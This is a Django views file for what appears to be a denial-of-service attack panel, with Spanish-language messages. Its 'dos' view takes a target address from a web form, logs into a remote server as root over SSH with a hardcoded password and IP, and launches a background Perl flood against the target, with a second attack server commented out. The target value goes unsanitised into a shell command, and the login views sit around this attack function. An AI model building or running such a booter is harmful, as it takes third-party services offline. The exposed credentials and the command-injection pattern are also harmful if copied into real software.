from django.shortcuts import render, redirect
from fabric import Connection
from django.contrib.auth import authenticate, login, logout, models

# Create your views here.

def home(request):
    return render(request, 'main.html')

def dos(request):
    if request.method == 'POST':
        post = request.POST['address']
        r1 = Connection('45.77.198.56', user='root', port='22', connect_kwargs={'password':'domain22'})
        # r2 = Connection('74.91.121.227', user='root', port='22', connect_kwargs={'password':'domain22'})
        r1.run('nohup perl 1 {0} 80 4096 15 2>/dev/null >/dev/null &'.format(post))
        # r2.run('nohup perl 1 {0} 80 4096 15 2>/dev/null >/dev/null &'.format(post))
        return render(request, 'dos.html', {'message':'Ataque enviado correctamente! por favor espera 15 segundos antes de volver a lanzar otro ataque!'})
    return render(request, 'dos.html')

def ingresar(request):
        if request.method == 'POST':
                uname = request.POST['username']
                upass = request.POST['password']
                a = authenticate(request, username=uname, password=upass)
                if a is not None:
                        login(request, a)
                        user = models.User.objects.get(username=uname)
                        return render(request, 'dos.html', {'user':user})
        return render(request, 'dos.html')

def salir(request):
        logout(request)
        return redirect('dos')